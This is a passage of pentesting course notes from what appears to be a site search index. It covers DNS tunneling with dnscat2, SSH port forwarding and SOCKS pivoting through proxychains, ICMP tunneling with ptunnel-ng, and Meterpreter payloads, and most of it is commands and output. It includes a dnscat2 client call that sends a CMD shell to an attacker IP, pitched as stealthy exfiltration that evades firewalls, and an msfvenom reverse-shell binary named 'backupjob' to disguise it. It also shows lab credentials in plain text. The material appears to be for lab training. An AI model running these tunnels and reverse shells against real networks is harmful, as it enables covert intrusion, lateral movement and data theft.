overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in.</p> <pre><code>PS C:\\xyz&gt; Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl\n\nName     : OneDrive\ncommand  : \"C:\\Users\\mrb0b\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background\nLocation : HKU\\S-1-5-21-2374636737-2633833024-1808968233-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nUser     : WINLPE-WS01\\mrb0b\n\nName     : Windscribe\ncommand  : \"C:\\Program Files (x86)\\Windscribe\\Windscribe.exe\" -os_restart\nLocation : HKU\\S-1-5-21-2374636737-2633833024-1808968233-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nUser     : WINLPE-WS01\\mrb0b\n\nName     : SecurityHealth\ncommand  : %windir%\\system32\\SecurityHealthSystray.exe\nLocation : HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nUser     : Public\n\nName     : VMware User Process\ncommand  : \"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\" -n vmusr\nLocation : HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nUser     : Public\n\nName     : VMware VM3DService Process\ncommand  : \"C:\\WINDOWS\\system32\\vm3dservice.exe\" -u\nLocation : HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nUser     : Public\n</code></pre>","title":"Weak Permissions"},{"location":"ptpf/dns_tunneling_dnscat2/","text":"<p>Dnscat2 is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted <code>C2</code> channel and sends data inside TXT records within the DNS protocol. Usually, every active directory domain environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system. However, with dnscat2, the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic. For our testing example, we can use dnscat2 server on our attack host, and execute the dnscat2 client on another Windows host.</p> <pre><code>secops@kali[/kali]$ git clone https://github.com/iagox86/dnscat2.git\n\ncd dnscat2/server/\ngem install bundler\nbundle install\n</code></pre> <p>We can then start the dnscat2 server by executing the dnscat2 file. <pre><code>secops@kali[/kali]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=legalcorp.local --no-cache\n\nNew window created: 0\ndnscat2&gt; New window created: crypto-debug\nWelcome to dnscat2! Some documentation may be out of date.\n\nauto_attach =&gt; false\nhistory_size (for new windows) =&gt; 1000\nSecurity policy changed: All connections must be encrypted\nNew window created: dns1\nStarting Dnscat2 DNS server on 10.10.14.18:53\n[domains = legalcorp.local]...\n\nAssuming you have an authoritative DNS server, you can run\nthe client anywhere with the following (--secret is optional):\n\n  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 legalcorp.local\n\nTo talk directly to the server without a domain name, run:\n\n  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21\n\nOf course, you have to figure out &lt;server&gt; yourself! Clients\nwill connect directly on UDP port 53.\n</code></pre></p> <p>After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server. We can use the client with the dnscat2 project or use dnscat2-powershell, a dnscat2 compatible PowerShell-based client that we can run from Windows targets to establish a tunnel with our dnscat2 server.</p> <pre><code>secops@kali[/kali]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git\n</code></pre> <p>Once the <code>dnscat2.ps1</code> file is on the target we can import it and run associated cmd-lets.</p> <pre><code>PS C:\\xyz&gt; Import-Module .\\dnscat2.ps1\n</code></pre> <p>After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.</p> <pre><code>PS C:\\xyz&gt; Start-Dnscat2 -DNSserver 10.10.14.18 -Domain legalcorp.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd \n</code></pre> <p>We must use the pre-shared secret (<code>-PreSharedSecret</code>) generated on the server to ensure our session is established and encrypted.</p> <p>Confirming Session Establishment <pre><code>New window created: 1\nSession 1 Security: ENCRYPTED AND VERIFIED!\n(the security depends on the strength of your pre-shared secret!)\n\ndnscat2&gt;\n</code></pre></p> <p>Listing dnscat2 Options <pre><code>dnscat2&gt; ?\n\nHere is a list of commands (use -h on any of them for additional help):\n* echo\n* help\n* kill\n* quit\n* set\n* start\n* stop\n* tunnels\n* unset\n* window\n* windows\n</code></pre></p> <p>We can use dnscat2 to interact with sessions and move further in a target environment on engagements.</p> <p>Interacting with the Established Session <pre><code>dnscat2&gt; window -i 1\nNew window created: 1\nhistory_size (session) =&gt; 1000\nSession 1 Security: ENCRYPTED AND VERIFIED!\n(the security depends on the strength of your pre-shared secret!)\nThis is a console session!\n\nThat means that anything you type will be sent as-is to the\nclient, and anything they type will be displayed as-is on the\nscreen! If the client is executing a command and you don't\nsee a prompt, try typing 'pwd' or something!\n\nTo go back, type ctrl-z.\n\nMicrosoft Windows [Version 10.0.18363.1801]\n(c) 2019 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;\nexec (OFFICEMANAGER) 1&gt;\n</code></pre></p>","title":"DNS Tunneling w/ Dnscat2"},{"location":"ptpf/dynamic_port_forwarding_ssh/","text":"SSH Local Port Forwarding <p>We have our attack host (10.10.15.x) and a target Ubuntu server (10.129.x.x), which we have compromised. We will scan the target Ubuntu server using Nmap to search for open ports.</p> <pre><code>secops@kali[/kali]$ nmap -sT -p22,3306 10.129.202.64\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST\nNmap scan report for 10.129.202.64\nHost is up (0.12s latency).\n\nPORT     STATE  SERVICE\n22/tcp   open   ssh\n3306/tcp closed mysql\n\nNmap done: 1 IP address (1 host up) scanned in 0.68 seconds\n</code></pre> <p>Forward our local port (1234) over SSH to the Ubuntu server. <pre><code>secops@kali[/kali]$ ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64\n\nubuntu@10.129.202.64's password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Thu 24 Feb 2022 05:23:20 PM UTC\n\n  System load:             0.0\n  Usage of /:              28.4% of 13.72GB\n  Memory usage:            34%\n  Swap usage:              0%\n  Processes:               175\n  Users logged in:         1\n  IPv4 address for ens192: 10.129.202.64\n  IPv6 address for ens192: dead:beef::250:56ff:feb9:52eb\n  IPv4 address for ens224: 172.16.5.129\n\n * Super-optimized for small spaces - read how we shrank the memory\n   footprint of MicroK8s to make it the smallest full K8s around.\n\n   https://ubuntu.com/blog/microk8s-memory-optimisation\n\n66 updates can be applied immediately.\n45 of these updates are standard security updates.\nTo see these additional updates run: apt list --upgradable\n</code></pre></p> <p>The <code>-L</code> command tells the SSH client to request the SSH server to forward all the data we send via the port <code>1234</code> to <code>localhost:3306</code> on the Ubuntu server. By doing this, we should be able to access the MySQL service locally on port 1234.</p> <p>Confirming Port Forward with Netstat <pre><code>secops@kali[/kali]$ netstat -antp | grep 1234\n\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\ntcp        0      0 127.0.0.1:1234          0.0.0.0:*               LISTEN      4034/ssh            \ntcp6       0      0 ::1:1234                :::*                    LISTEN      4034/ssh     \n</code></pre></p> <p>Confirming Port Forward with Nmap <pre><code>secops@kali[/kali]$ nmap -v -sV -p1234 localhost\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:18 EST\nNSE: Loaded 45 scripts for scanning.\nInitiating Ping Scan at 12:18\nScanning localhost (127.0.0.1) [2 ports]\nCompleted Ping Scan at 12:18, 0.01s elapsed (1 total hosts)\nInitiating Connect Scan at 12:18\nScanning localhost (127.0.0.1) [1 port]\nDiscovered open port 1234/tcp on 127.0.0.1\nCompleted Connect Scan at 12:18, 0.01s elapsed (1 total ports)\nInitiating Service scan at 12:18\nScanning 1 service on localhost (127.0.0.1)\nCompleted Service scan at 12:18, 0.12s elapsed (1 service on 1 host)\nNSE: Script scanning 127.0.0.1.\nInitiating NSE at 12:18\nCompleted NSE at 12:18, 0.01s elapsed\nInitiating NSE at 12:18\nCompleted NSE at 12:18, 0.00s elapsed\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.0080s latency).\nOther addresses for localhost (not scanned): ::1\n\nPORT     STATE SERVICE VERSION\n1234/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 1.18 seconds\n</code></pre></p> <p>Similarly, if we want to forward multiple ports from the Ubuntu server to your localhost, you can do so by including the <code>local port:server:port</code> argument to your ssh command. For example, forward the apache web server's port 80 to our attack host's local port on <code>8080</code>.</p> <pre><code>secops@kali[/kali]$ ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64\n</code></pre>  Setting up to Pivot <p>Looking for Opportunities to Pivot using ifconfig <pre><code>ubuntu@WEB01:~$ ifconfig \n\nens192: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 10.129.202.64  netmask 255.255.0.0  broadcast 10.129.255.255\n        inet6 dead:beef::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x0&lt;global&gt;\n        inet6 fe80::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x20&lt;link&gt;\n        ether 00:50:56:b9:52:eb  txqueuelen 1000  (Ethernet)\n        RX packets 35571  bytes 177919049 (177.9 MB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 10452  bytes 1474767 (1.4 MB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nens224: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255\n        inet6 fe80::250:56ff:feb9:a9aa  prefixlen 64  scopeid 0x20&lt;link&gt;\n        ether 00:50:56:b9:a9:aa  txqueuelen 1000  (Ethernet)\n        RX packets 8251  bytes 1125190 (1.1 MB)\n        RX errors 0  dropped 40  overruns 0  frame 0\n        TX packets 1538  bytes 123584 (123.5 KB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 270  bytes 22432 (22.4 KB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 270  bytes 22432 (22.4 KB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n</code></pre></p> <p>Unlike the previous scenario where we knew which port to access, in our current scenario, we don't know which services lie on the other side of the network. So, we can scan smaller ranges of IPs on the network (<code>172.16.5.1-200</code>) network or the entire subnet (<code>172.16.5.0/23</code>).</p> <p>Enabling Dynamic Port Forwarding with SSH <pre><code>secops@kali[/kali]$ ssh -D 9050 ubuntu@10.129.202.64\n</code></pre></p> <p>To inform proxychains that we must use port 9050, we must modify the proxychains configuration file located at <code>/etc/proxychains.conf</code>.</p> <pre><code>secops@kali[/kali]$ tail -4 /etc/proxychains.conf\n\n# meanwile\n# defaults set to \"tor\"\nsocks4  127.0.0.1 9050\n</code></pre> <p>Now when we start Nmap with proxychains, it will route all the packets of Nmap to the local port 9050, where our SSH client is listening, which will forward all the packets over SSH to the 172.16.5.0/23 network.</p> <pre><code>secops@kali[/kali]$ proxychains nmap -v -sn 172.16.5.1-200\n\nProxyChains-3.1 (http://proxychains.sf.net)\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:30 EST\nInitiating Ping Scan at 12:30\nScanning 10 hosts [2 ports/host]\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.2:80-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.5:80-&lt;&gt;&lt;&gt;-OK\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.6:80-&lt;--timeout\nRTTVAR has grown to over 2.3 seconds, decreasing to 2.0\n\n&lt;SNIP&gt;\n</code></pre> <p>This part of packing all Nmap data using proxychains and forwarding it to a remote server is called <code>SOCKS tunneling</code>. We can only perform a full TCP connect scan over proxychains. We also need to make sure we are aware of the fact that <code>host-alive</code> checks may not work against Windows targets because the Windows Defender firewall blocks ICMP requests (traditional pings) by default.</p> <p>A full TCP connect scan without ping on an entire network range will take a long time.</p> <pre><code>secops@kali[/kali]$ proxychains nmap -v -Pn -sT 172.16.5.19\n\nProxyChains-3.1 (http://proxychains.sf.net)\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:33 EST\nInitiating Parallel DNS resolution of 1 host. at 12:33\nCompleted Parallel DNS resolution of 1 host. at 12:33, 0.15s elapsed\nInitiating Connect Scan at 12:33\nScanning 172.16.5.19 [1000 ports]\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:1720-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:587-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:445-&lt;&gt;&lt;&gt;-OK\nDiscovered open port 445/tcp on 172.16.5.19\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:8080-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:23-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:135-&lt;&gt;&lt;&gt;-OK\nDiscovered open port 135/tcp on 172.16.5.19\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:110-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:21-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:554-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-1172.16.5.19:25-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:5900-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:1025-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:143-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:199-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:993-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:995-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:3389-&lt;&gt;&lt;&gt;-OK\nDiscovered open port 3389/tcp on 172.16.5.19\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:443-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:80-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:113-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:8888-&lt;--timeout\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:139-&lt;&gt;&lt;&gt;-OK\nDiscovered open port 139/tcp on 172.16.5.19\n</code></pre>  Using Metasploit with Proxychains <pre><code>secops@kali[/kali]$ proxychains msfconsole\n\nProxyChains-3.1 (http://proxychains.sf.net)\n\n\n     .~+P``````-o+:.                                      -o+:.\n.+oooyysyyssyyssyddh++os-`````                        ```````````````          `\n+++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o\n++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy\n--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///\n                                `...............`              `...-/////...`\n\n\n                                  .::::::::::-.                     .::::::-\n                                .hmMMMMMMMMMMNddds\\...//M\\\\.../hddddmMMMMMMNo\n                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&amp;&amp;MMMMMMMMMMMMMMy\n                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMMMMh`\n                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMMMh`\n                                   -Nh` .yMMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMMm/\n    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMm/\n      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMd\n    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/\n    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:\n          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+\n          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\\\.^^`:++:^^o://^^^\\\\`::\n          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||\n........../yddy/:...+hmo-...hdd:............\\\\=v=//............\\\\=v=//.........\n================================================================================\n=====================+--------------------------------+=========================\n=====================| Session one died of dysentery. |=========================\n=====================+--------------------------------+=========================\n================================================================================\n\n                     Press ENTER to size up the situation\n\n%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%\n%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n\n                        Press SPACE BAR to continue\n\n\n\n       =[ metasploit v6.1.27-dev                          ]\n+ -- --=[ 2196 exploits - 1162 auxiliary - 400 post       ]\n+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]\n+ -- --=[ 9 evasion                                       ]\n\nMetasploit tip: Adapter names can be used for IP params \nset LHOST eth0\n\nmsf6 &gt; \n</code></pre> <p>Use the <code>rdp_scanner</code> auxiliary module to check if the host on the internal network is listening on 3389.</p> <pre><code>msf6 &gt; search rdp_scanner\n\nMatching Modules\n================\n\n   #  Name                               Disclosure Date  Rank    Check  Description\n   -  ----                               ---------------  ----    -----  -----------\n   0  auxiliary/scanner/rdp/rdp_scanner                   normal  No     Identify endpoints speaking the Remote Desktop Protocol (RDP)\n\n\nInteract with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/rdp/rdp_scanner\n\nmsf6 &gt; use 0\nmsf6 auxiliary(scanner/rdp/rdp_scanner) &gt; set rhosts 172.16.5.19\nrhosts =&gt; 172.16.5.19\nmsf6 auxiliary(scanner/rdp/rdp_scanner) &gt; run\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:3389-&lt;&gt;&lt;&gt;-OK\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:3389-&lt;&gt;&lt;&gt;-OK\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:3389-&lt;&gt;&lt;&gt;-OK\n\n[*] 172.16.5.19:3389      - Detected RDP on 172.16.5.19:3389      (name:DC01) (domain:DC01) (domain_fqdn:DC01) (server_fqdn:DC01) (os_version:10.0.17763) (Requires NLA: No)\n[*] 172.16.5.19:3389      - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre> <p>Depending on the level of access we have to this host during an assessment, we may try to run an exploit or log in using gathered credentials. </p> <p>Using xfreerdp with Proxychains <pre><code>secops@kali[/kali]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123\n\nProxyChains-3.1 (http://proxychains.sf.net)\n[13:02:42:481] [4829:4830] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state\n[13:02:42:482] [4829:4830] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr\n[13:02:42:482] [4829:4830] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd\n[13:02:42:482] [4829:4830] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr\n</code></pre></p>","title":"Dynamic Port Forwarding w/ SSH and SOCKS Tunneling"},{"location":"ptpf/icmp_tunneling_socks/","text":"<p>ICMP tunneling encapsulates traffic within <code>ICMP packets</code> containing <code>echo requests</code> and <code>responses</code>. ICMP tunneling would only work when ping responses are permitted within a firewalled network. When a host within a firewalled network is allowed to ping an external server, it can encapsulate its traffic within the ping echo request and send it to an external server. The external server can validate this traffic and send an appropriate response, which is extremely useful for data exfiltration and creating pivot tunnels to an external server.</p> <pre><code>secops@kali[/kali]$ git clone https://github.com/utoni/ptunnel-ng.git\n</code></pre> <pre><code>secops@kali[/kali]$ sudo ./autogen.sh \n</code></pre> <p>After running authgen.sh, ptunnel-ng can be used from the client and server-side. We will now need to transfer the repo from our attack host to the target host. <pre><code>secops@kali[/kali]$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/\n</code></pre></p> <p>Starting the ptunnel-ng Server on the Target Host <pre><code>ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22\n\n[sudo] password for ubuntu: \n./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)\n[inf]: Starting ptunnel-ng 1.42.\n[inf]: (c) 2004-2011 Daniel Stoedle, &lt;daniels@cs.uit.no&gt;\n[inf]: (c) 2017-2019 Toni Uhlig,     &lt;matzeton@googlemail.com&gt;\n[inf]: Security features by Sebastien Raveau, &lt;sebastien.raveau@epita.fr&gt;\n[inf]: Forwarding incoming ping packets over TCP.\n[inf]: Ping proxy is listening in privileged mode.\n[inf]: Dropping privileges now.\n</code></pre></p> <p>The IP address following <code>-r</code> should be the IP we want ptunnel-ng to accept connections on. In this case, whatever IP is reachable from our attack host would be what we would use.</p> <p>We can attempt to connect to the ptunnel-ng server but ensure this happens through local port 2222 (<code>-l2222</code>). Connecting through local port 2222 allows us to send traffic through the ICMP tunnel.</p> <pre><code>secops@kali[/kali]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22\n\n[inf]: Starting ptunnel-ng 1.42.\n[inf]: (c) 2004-2011 Daniel Stoedle, &lt;daniels@cs.uit.no&gt;\n[inf]: (c) 2017-2019 Toni Uhlig,     &lt;matzeton@googlemail.com&gt;\n[inf]: Security features by Sebastien Raveau, &lt;sebastien.raveau@epita.fr&gt;\n[inf]: Relaying packets from incoming TCP streams.\n</code></pre> <p>With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (<code>-p2222</code>).</p> <pre><code>secops@kali[/kali]$ ssh -p2222 -lubuntu 127.0.0.1\n\nubuntu@127.0.0.1's password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Wed 11 May 2022 03:10:15 PM UTC\n\n  System load:             0.0\n  Usage of /:              39.6% of 13.72GB\n  Memory usage:            37%\n  Swap usage:              0%\n  Processes:               183\n  Users logged in:         1\n  IPv4 address for ens192: 10.129.202.64\n  IPv6 address for ens192: dead:beef::250:56ff:feb9:52eb\n  IPv4 address for ens224: 172.16.5.129\n\n * Super-optimized for small spaces - read how we shrank the memory\n   footprint of MicroK8s to make it the smallest full K8s around.\n\n   https://ubuntu.com/blog/microk8s-memory-optimisation\n\n144 updates can be applied immediately.\n97 of these updates are standard security updates.\nTo see these additional updates run: apt list --upgradable\n\n\nLast login: Wed May 11 14:53:22 2022 from 10.10.14.18\nubuntu@WEB01:~$ \n</code></pre> <p>On the client &amp; server side of the connection, we will notice ptunnel-ng gives us session logs and traffic statistics associated with the traffic that passes through the ICMP tunnel. This is one way we can confirm that our traffic is passing from client to server utilizing ICMP.</p> <pre><code>inf]: Incoming tunnel request from 10.10.14.18.\n[inf]: Starting new session to 10.129.202.64:22 with ID 20199\n[inf]: Received session close from remote peer.\n[inf]: \nSession statistics:\n[inf]: I/O:   0.00/  0.00 mb ICMP I/O/R:      248/      22/       0 Loss:  0.0%\n[inf]: \n</code></pre> <p>We may also use this tunnel and SSH to perform dynamic port forwarding to allow us to use proxychains in various ways. <pre><code>secops@kali[/kali]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1\n\nubuntu@127.0.0.1's password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)\n&lt;snip&gt;\n</code></pre></p> <p>We could use proxychains with Nmap to scan targets on the internal network (172.16.5.x). Based on our discoveries, we can attempt to connect to the target. <pre><code>secops@kali[/kali]$ proxychains nmap -sV -sT 172.16.5.19 -p3389\n\nProxyChains-3.1 (http://proxychains.sf.net)\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-11 11:10 EDT\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:80-&lt;&gt;&lt;&gt;-OK\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:3389-&lt;&gt;&lt;&gt;-OK\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:3389-&lt;&gt;&lt;&gt;-OK\nNmap scan report for 172.16.5.19\nHost is up (0.12s latency).\n\nPORT     STATE SERVICE       VERSION\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.78 seconds\n</code></pre></p>","title":"ICMP Tunneling with SOCKS"},{"location":"ptpf/meterpreter_tunneling_and_port_forwarding/","text":"<p>Creating Payload for Ubuntu Pivot Host <pre><code>secops@kali[/kali]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080\n\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 130 bytes\nFinal size of elf file: 250 bytes\nSaved as: backupjob\n</code></pre></p> <p>Before copying the payload over, we can start a multi/handler.</p> <pre><code>msf6 &gt; use exploit/multi/handler\n\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) &gt; set lhost 0.0.0.0\nlhost =&gt; 0.0.0.0\nmsf6 exploit(multi/handler) &gt; set lport 8080\nlport =&gt; 8080\nmsf6 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp\npayload =&gt; linux/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) &gt; run\n[*] Started reverse TCP handler on 0.0.0.0:8080 \n</code></pre> <p>We can copy the <code>backupjob</code> binary file to the Ubuntu pivot host <code>over SSH</code> and execute it to gain a Meterpreter session.</p> <pre><code>ubuntu@WebServer:~$ ls\n\nbackupjob\nubuntu@WebServer:~$ chmod +x backupjob \nubuntu@WebServer:~$ ./backupjob\n</code></pre> <pre><code>[*] Sending stage (3020772 bytes) to 10.129.202.64\n[*] Meterpreter session 1 opened (10.10.14.18:8080 -&gt; 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500\nmeterpreter &gt; pwd\n\n/home/ubuntu\n</code></pre> <p>We know that the Windows target is on the 172.16.5.0/23 